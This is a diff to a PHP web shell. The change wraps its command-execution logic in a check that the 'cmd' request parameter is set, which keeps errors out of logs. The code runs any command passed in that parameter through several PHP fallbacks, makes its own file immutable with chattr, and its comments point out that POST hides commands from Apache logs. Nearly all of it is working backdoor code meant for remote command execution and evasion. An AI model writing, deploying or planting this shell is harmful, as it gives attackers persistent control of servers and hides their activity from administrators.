@@ -13,31 +13,35 @@ $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
 @system("chattr +i $this_file");
 
-# grab the command we want to run from the 'cmd' GET or POST parameter (POST do not display the command on apache logs)
-$command = $_REQUEST["cmd"];
+# test if parameter 'cmd' is present. If not this will avoid an error on logs or on all pages if badly configured.
+if(isset($_REQUEST['cmd'])) {
 
-# Try to find a way to run our command using various PHP internals
-if (class_exists('ReflectionFunction')) {
+    # grab the command we want to run from the 'cmd' GET or POST parameter (POST don't display the command on apache logs)
+    $command = $_REQUEST['cmd'];
 
-   # http://php.net/manual/en/class.reflectionfunction.php
-   $function = new ReflectionFunction('system');
-   $function->invoke($command);
+    # Try to find a way to run our command using various PHP internals
+    if (class_exists('ReflectionFunction')) {
 
-} elseif (function_exists('call_user_func_array')) {
+       # http://php.net/manual/en/class.reflectionfunction.php
+       $function = new ReflectionFunction('system');
+       $function->invoke($command);
 
-   # http://php.net/manual/en/function.call-user-func-array.php
-   call_user_func_array('system', array($command));
+    } elseif (function_exists('call_user_func_array')) {
 
-} elseif (function_exists('call_user_func')) {
+       # http://php.net/manual/en/function.call-user-func-array.php
+       call_user_func_array('system', array($command));
 
-   # http://php.net/manual/en/function.call-user-func.php
-   call_user_func('system', $command);
+    } elseif (function_exists('call_user_func')) {
 
-} else {
+       # http://php.net/manual/en/function.call-user-func.php
+       call_user_func('system', $command);
 
-   # this is the last resort. chances are PHP Suhosin
-   # has system() on a blacklist anyways :>
+    } else {
 
-   # http://php.net/manual/en/function.system.php
-   system($command);
+       # this is the last resort. chances are PHP Suhosin
+       # has system() on a blacklist anyways :>
+
+       # http://php.net/manual/en/function.system.php
+       system($command);
+    }
 }
